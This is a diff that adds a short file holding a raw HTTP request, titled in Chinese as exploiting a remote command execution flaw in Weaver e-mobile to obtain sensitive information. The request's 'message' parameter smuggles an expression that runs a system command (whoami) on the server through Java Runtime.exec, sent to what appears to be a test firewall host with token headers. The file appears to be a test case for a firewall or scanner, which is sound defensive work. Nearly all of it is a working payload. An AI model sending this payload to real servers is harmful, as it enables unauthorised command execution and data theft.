@@ -1,0 +1,9 @@
+# 利用【泛微e-mobile远程命令执行漏洞获取敏感信息】-30000335
+# 利用泛微e-mobile远程命令执行漏洞获取敏感信息。
+GET /login.do?acid=30000335&message=@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29&bid=hd_tag_m8mv26bi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26bi
+RM-PRO-Token: db1e1c2a3034b5c04bd8c85e71f632dd
+RM-PRO-Time: 1742808573980
+User-Agent: curl/7.83.1
+
